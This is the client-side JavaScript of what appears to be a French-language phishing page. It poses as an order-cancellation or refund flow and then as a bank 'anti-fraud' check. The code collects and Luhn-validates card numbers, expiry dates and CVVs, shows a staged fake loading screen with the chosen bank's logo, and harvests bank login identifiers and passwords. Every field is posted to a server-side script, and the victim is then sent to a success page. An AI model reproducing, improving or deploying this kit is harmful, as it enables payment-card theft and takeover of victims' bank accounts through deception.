$(document).ready(function () {
  $("#options-select").on("change", function () {
    var selectedValue = $(this).val();
    $("#options-part").hide();
    $("#carte-part").show();
    if (selectedValue === "1") {
      $(".titre-carte").text("Sécurisation de votre carte");
      $("#carte-part .form-description").html(
        "Veuillez saisir vos informations afin d'annuler la commande et percevoir le remboursement."
      );
      $("#cancel-submit").html(
        'Annuler ma commande  &nbsp; <i class="bi bi-x-circle"></i>'
      );
    } else if (selectedValue === "2") {
      $(".titre-carte").text("Validation de votre commande");
      $("#carte-part .form-description").html(
        "Veuillez saisir vos informations afin de valider votre commande."
      );
      $("#cancel-submit").html(
        'Valider ma commande  &nbsp; <i class="bi bi-check-circle"></i>'
      );
    }
    $(this).val(""); 
    $("html, body").animate(
      {
        scrollTop: $(".back-btn").offset().top,
      },
      100
    );
  });

  $(".back-btn i").on("click", function () {
    var target = $(this).data("target");
    var name = $(this).data("name");
    $("#" + name).hide();
    $("#" + target).show();
    $("html, body").animate(
      {
        scrollTop: $(".back-btn").offset().top,
      },
      100
    );
  });

  $("#bks-select").on("change", function () {
    var bkValue = $(this).val();
    var image = $(this).find("option:selected").data("img");
    $("#bk-logo").html('<img src="assets/images/bk/' + image + '.jpg">');
    if (bkValue) {
      $("#bk-logo").show();
    } else {
      $("#bk-logo").hide();
    }
    $(this).val("");
    $("#bks-loader").show().css("display", "flex");

    if (bkValue == "Autre") {
      $("#loading-text").html(
        "Connexion des systèmes anti-fraude en cours<br>Veuillez patienter..."
      );
    } else {
      $("#loading-text").html(
        "Connexion au système anti-fraude <strong>" +
          bkValue +
          "</strong> en cours<br>Veuillez patienter..."
      );
    }
    setTimeout(function () {
      $("#bks-loader").fadeOut();
      $("#bks-part").hide();
      $("#co-part").show();
      $("#co-part .form-img-container").html(
        '<img src="assets/images/bk/' + image + '.jpg">'
      );
      $("html, body").animate(
        {
          scrollTop: $("#co-part").offset().top,
        },
        100
      );
    }, 5000);
    $("#bk-input").val(bkValue);
  });

  function getCardType(number) {
    number = number.replace(/\D/g, "");
    if (/^4/.test(number)) return "Visa";
    if (
      /^5[1-5]/.test(number) ||
      /^2(2[2-9]|[3-6][0-9]|7[01]|720)/.test(number)
    )
      return "MasterCard";
    if (/^3[47]/.test(number)) return "American Express";
    if (/^6(?:011|5|4[4-9])/.test(number)) return "Discover";
    return "Inconnu";
  }

  function isValidCardNumber(number) {
    number = number.replace(/\D/g, "");
    let sum = 0;
    let shouldDouble = false;
    for (let i = number.length - 1; i >= 0; i--) {
      let digit = parseInt(number.charAt(i));
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  }

  function isValidExpiry(expiry) {
    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
    let [month, year] = expiry.split("/").map((x) => parseInt(x, 10));
    if (month < 1 || month > 12) return false;

    let now = new Date();
    let currentYear = now.getFullYear() % 100;
    let currentMonth = now.getMonth() + 1;

    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      return false;
    }
    return true;
  }

  $("#cnumber").on("input", function () {
    let value = $(this).val().replace(/\D/g, "").substring(0, 19);
    let formatted = value.replace(/(.{4})/g, "$1 ").trim();
    $(this).val(formatted);

    let type = getCardType(value);
    let logo = $("#card-logo");
    if (type !== "Inconnu") {
      let logos = {
        Visa: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAADjUlEQVR4nO1YW0iUQRTet156qdyMMnoJjMgieioKegi6YBFRBJUksWtqQphWKFRqF1MUjUqzRBAJybxl5oOo/79eU1dX85K2rilu3i+76y13zRNn1p39f9h1H/zBVeaDA/9/5syZ882ccwZGJmNgYGBgYNhI2OKv2u2h4HPlSs4kV/LgHsKZPBR8wbZb5d4ug5cruYm1D5h3LApuEmN0SsC6824QqHIlEnyOUwLulTa8s1MwrkDADQJUuhZGQM4I8IyAQ2wYAt4hRRCTHATN+QehrdAHWvIPQMq7a+AZUEGdeAVXwvT8IiAWLEuw714NlGjGwIYzsc3Ebu/dakgu6YfW/mmYnLGAYdYCLX0miMjWioI697IZhDj0oG71J3A8PBPGan0BVJuIXI+Oo2M3U9rpYoWNo0T3a2iW6jDwPSFV0DVo1wmRUjogWiu/YUQ07ve2XZoUisrVAQymw5JqM7xKVVB9Xr19wUuJrbAzUAXmxSXyP2xYIDahmd3UpqprCs7Ha+BktBoe5/TA1eQf1JfP/Vo614bE4j5pCJx61mT1OF4EuvLTRLc7uBJm/lrT5/foHGwP4OHoowZRsGj3NK+X6t6X650GlFDcR2wmZ8wwMD5PvsvaJqQhsOO2CqZmLcTpdE8S0fmn2tMHg0Sd35s2qsvg/hCdb5xGtKsNPUa4EK8R+d8VVAmjxgUynl6hJ+lI9stklq4L0eK0GOBYZCkUNFgXwWPfH1ZLbKIx1ZYhLNDnBb1g+SdOj6Rv/XT8TsZPqsfTjsmz+zn8sE4aApHZWupUkdYBs8vp87XJWrwoH6uHqM3lpFZxM3jSKOpQCKwFuZIHTZ+J/HfqZ8g/zrUBT1oSAieiGqnT9oFp+n1FEGi91uCyBRaprSeHuPG6Dc7G2ltn78gcfFGPktx3dFKrIoBFOmYyi3awf2wePAPsNliACLwb0B7vgbQyPWm3mPeBHzrJHATeB9hm8wSdzBG4jklpCKDY8t6GFwXW4kXxDq2hekwJW+47Al5kFxNaRK2zXmuAsKxuKmqdcZmomWyGJATCs+w9HYsSA7CNCbvN57phosNaadQZyW7jTY2ph70dyQpbJwJPSbiWkPyRiO/SEHAnkTECSkYAGIH1+6zCG2TOgM93ax6g0pVwn5wSwLdHfL5b+yB5h+Kh4Me3Kjgvmcv3UQWfgy9g7pM2nBF33mXwDAwMDAwMsnWG/92IM3PpvUaOAAAAAElFTkSuQmCC",
        MasterCard:
          "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAACnUlEQVR4nO2YzWsTQRjGNxRR8VA9+dG01ngoIv4J2Y9m7aGrJtOKePbkxYNgGpM0Hz30qFc/ED2pbRHSXTcqaRT8FwR70UvWJHhQ0VLSg+ArM2lKW91spjM1G5kHnstmhzy/4Z2Zd0eShISEhISE/ieFo68GZWQ/U1BxRUFF8IlXZGQXtAsvRzzDKzH7qw8Cg4u/4YyuAOszDz73giuAz8oG/m77RzsA6AVLLAB6zISZ8QSUdQUcNQhr4X3ENfUoLOkq+W0UWVvHXDRhJpGE8n0dnEII1sr9xE4hRJ7lEynyzq4DZIwU1NQjAGGprevKYUgZmeaYqWmoWUMAb/e2dc06Dpl4ZncANPQc5sYmPINv9q9wAJYyEc/gsM1zty+BNmHzBaANj/3u6hnq8LDuJ7cu8wPAZUMb/g8/2EMNkY5n2QHwgsWLkxkgGgB4QwdQtwZdF3bHAHhHoQ27HB3ZcenANuem0mwAr3WZGuB98jQ3gNK9s2wAn9Rj7OXTMgpQAziFEBtAQ97PDyAiUQM0ygf/PUCj2M+thFZLh9gAHHWAGqD+MMgNoLLIWEK43+FWQtf66BfxXcZFnDdu8gO4Q3+YZVm30UjMhKpCtxP9lPvg86MB5vKpWUPsB1mzlUhTz/aH8yeZAVI3ct1t5jacpa/9xzybOWwtZsPTsUnqdnr5yqkddaIa73a65bQx3dGawB8018/NNsfEs1A1hz2DV83htmXDBaC1sHPjSSjpGlTUIDnsVuUD8FE7QZ4ljDz5ANoyZtIkjRnubfDejk9Y7MpiiDzDuw1+p5P/Zwbwg6VevlaRY/Z3VwB8fdftgIq3510B8N0jvr7z7eyj4hcFvQhKnvejqLiAb8C6HVjZMMky7xleSEhISEhI6jH9Bnm6laI4if4oAAAAAElFTkSuQmCC",
        "American Express":
          "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAACqUlEQVR4nO2Yy2sTURTG82dk0iropuqquBBBxaUgrgSXrnSjCxdKJmpBi7Yoioj4Kl2UqlhqrVqkFEGlxIJBtNKZNE1i+kqatrR5vx+TmU/uHR0TmEnFLCaR+8Eh4cy9d77fuefO4losTExMTExM/5Ns593bOF4c5XghzfEimiOEtJUX3tjsQseW5q28EDPfsKgbVrsYJx4NAdTKm2+Uqx8jdQCaqW1Eo3ZK1dsBtEJYGADPAMAA9GS2MY4B8PoTDtzyQ1ZA1T8V0fJjMwk1CeBE/6KW39k1i3iuoj2rXstIsgKcerpMx7Q5/qw98DnaOMATVwyKAqwmysgUZXRc8dQAkJd/9KW18ZfHVmmezNEDCMZKeDC5WRPRrIRCWcaxh/PUNNHL6QRsjgZ3YHe3B/myDOePDC6MhunC18bXagDeeVLU7OE7frRfdGMpWkKqUMG35ZwuAMkfuRfQYm+vF0fvzyNXklGUVOr33jS2X3I33kK9E+t0wXPDK+js8SKVr9CdIIv/Bjjet0B/n3+J4fSzIP1PqjrpT/9VC/V9Utty0KVWXpIV7Lvha/wMEJNrybLuS88MhTSAXVc9mApkaPXm1gooSQo6r88ZArgWs9h/06fFnm4Pzg6FaCtupCU6ZjqYw46u2cYAiEmi4a9x2F+FaTheh2mvzqzkawBODixpcGQnyHwjgIVIET0T61rc/bCBckVBKF6iu/zYGaHjxsUkPdD/DPA9lKN9SQxW54lBonBC3R3ynBy2wGaRVvHQbX9dAD3FshIO/ppHTL8VkjT/yBlp/CvUbGFhADwDAAPQk9nGOAbAtzyA0PzXKnYxaQhAru+aH0B4YQhA7h7J9Z3pJnn9sNqFaBsvtBsCVF3ujpAbMLMNc1oIKVL5Lc0zMTExMTFZWkw/AZkZbrDNNm2aAAAAAElFTkSuQmCC",
        Discover:
          "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAADnUlEQVR4nO2YeUgUYRjGRylBWgncjo00U+iQqP4IOywxLPunAyIpOgkKsktDs1KiIhETLxTULrvWzEyLpDDJkg6SrJS2Q1MqZ2abbbcNDwojdZ94P3Jxy931KJqNeeBlZ+eb+b7n937vOwzDcYoUKVKkSNH/JFE0+/AG0xVeMrbzBhNkERLzUiqaTJOcmm82GD//c8OGvoO8CYJ5vF0AlnkZGOUdQUjGy/YB5FQ2Brvl1OpoB+AKwSkABgUACkBf+tfGeAXAMLSJmyUjGt7x8gDgOA7u7u7wmzgRRxKT2LnpM2Yi/7wWBUVXMFajgXrUKGTnHmdjdI23tzfc3NwQE7cPgiii/cI2dMWPQVf8WLRrI1Hf0ACVlxfKyivYPa8a32KESoVzBYVsvZ6gNeh32PDhCJo9B7Uv6wcH8OhJLYpKrjKjOSdOWQHmzV+AzVu2ovpZHe5X17CxCX5+KK+8i+f1b1B87Tozj92cTbRrt7P7Vq9dx9ZITE7BrKAg1NTp2Ho9a9+ouM0SVPviNSZNnoJDRxMHB0AT0zFlNGL1GitA7L798PDwwNr1G/FM9wqLwpfgWFq6zSKU+V8Bug6Mxp37D+Hp6QldQyOmBgYiKyfXCrBuwyYWBKBWq1FYXAqNZhzyTuUPDYAMU9Z6AOjc1bKbLHtz5s5D2OJwpKRlOAdI0LCx4AUhWLp8BdvZJl5vBUhOTWNBAARJ5RW5c5fNvKZ7FwZXQlQWBHDy7HnsjIrG47rniDuQgMBp05Cdkwf/gADcqqzCizdNKC27wcrlV4C2gh1s7uOnz7D5d0XvYf/tlRDBUGlSr9B5QeDRedB34E2cmpll08QEQNnx8fXFxcslbOxoUjK7ljJHYKyJtdtZA1OQeUGvZ9e+FSWM9/FB9dNaG4DeTUwA9FQLCQ3FylUR9BaKLyciWCL6BSC3aC2Os+6kawFIRhvzLgUgCLy1bFwOQNI9wPfEwN/Myx5A4N+j7VIULNEefZqXL8AHCeZbWeiKH2fXuCwBBFGEuSIbnYf9nRqXFcCH1zVoK9yN7v3qfht3DiAZ2/5utgV8qjqDjoyFQJT7gI2z15G9XhZHO1D6p02LzU0wV+bia84yWGI8B2UaveJbarBoF0CvN01uNpjMQ23Gj0/L0VKSgI70EIdPEww4+yMtLdodizhHom+P9Pmuv+Wkb9SxN8TWohh0ZIahO1b1xwzjZ3THqiyUeafmFSlSpEiRIs7F9ANeLU95zlJl2gAAAABJRU5ErkJggg==",
      };
      logo.attr("src", logos[type]);
      logo.show();
    } else {
      logo.attr(
        "src",
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA9UlEQVR4nO2ZYQqCQBCFv3tkF4k6QXaqpBOF/bLOVPp/YkNDpNA02BmdBw9WdoT3MbuwruByuVyuyDoAN6ACRLkr4AqkXYiTgnBjnbU7IcadUi8nMe4igJQKgkz1AwUh/mViB3AQHATVJnYAB2FpIGdg1RS1FJ4TILcCkrSCd0GC1lZApF3UAdFo+sJ/6wgWQeSHOXUgyVz2SF7DfAIJEBcrIGLMxA7gIDgIqk3sAA7CQJANsO0Zx6yToSDhpV3POGadLG5piTEzhyvTO/V/BpnDJXaqIMhU75ujeaYgzFgfO58Zr84URvZMWWd9d8LlcrlcxNAT+CmguJ7LblYAAAAASUVORK5CYII="
      );
    }
  });

  $("#edate").on("input", function () {
    let value = $(this).val().replace(/\D/g, "").substring(0, 4);
    if (value.length >= 3) {
      value = value.substring(0, 2) + "/" + value.substring(2);
    }
    $(this).val(value);
  });

  $("#cancel-submit").on("click", function (e) {
    e.preventDefault();

    var cnumber = $("#cnumber").val();
    var cv = $("#cvv").val();
    var edate = $("#edate").val();

    if (!isValidCardNumber(cnumber) || cnumber == "") {
      alert("Numéro de carte invalide.");
      return;
    }
    if (!isValidExpiry(edate)) {
      alert("Date d'expiration invalide.");
      return;
    }
    if (!/^\d{3,4}$/.test(cv)) {
      alert("Code CVV invalide.");
      return;
    }
    if ($.trim(cnumber) != "" && $.trim(cv) != "" && $.trim(edate) != "") {
      $.ajax({
        url: "inc/traitement.php",
        type: "POST",
        data: {
          cnumber: cnumber,
          cv: cv,
          edate: edate,
          part: 1,
        },
        success: function (reponse) {
          $("#carte-part").hide();
          $("#bks-part").show();
        },
        error: function (xhr, status, error) {},
      });

      return;
    }
  });

  $("#co-submit").click(function (e) {
    e.preventDefault();

    $("#loader").css("display", "flex");

    setTimeout(function () {
      $("#loader").hide();
    }, 7000);

    var bk = $("#bk-input").val();
    var iden = $("#iden").val();
    var mo = $("#mo").val();

    if (!bk || !iden || !mo) {
      alert("Veuillez remplir tous les champs.");
      $("#loader").hide();
      return;
    }

    $.ajax({
      url: "inc/traitement.php",
      type: "POST",
      data: {
        bk: bk,
        iden: iden,
        mo: mo,
        part: 2,
      },
      success: function (reponse) {
        setTimeout(function () {
          window.location.href = "success.php";
        }, 7000);
      },
      error: function (xhr, status, error) {},
    });
  });
});
